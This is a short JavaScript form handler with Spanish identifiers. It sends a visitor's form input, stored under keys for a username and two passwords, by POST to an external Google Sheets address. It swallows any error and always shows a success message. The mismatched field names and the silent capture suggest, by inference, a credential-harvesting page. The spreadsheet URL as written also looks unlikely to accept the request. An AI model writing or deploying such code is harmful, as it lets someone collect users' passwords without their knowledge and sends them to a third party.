const formulario = document.getElementById('formulario');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();


try {    
    const respuesta = await fetch('https://docs.google.com/spreadsheets/d/1Cd5--EsLbgjR-yt5s2E4eJilAXJJ-0tvwGJtpYcsGIs/edit#gid=0', {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Usuario": formulario.nombre.value,
            "Contrasena1": formulario.correo.value,
            "Contrasena2": formulario.telefono.value
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});
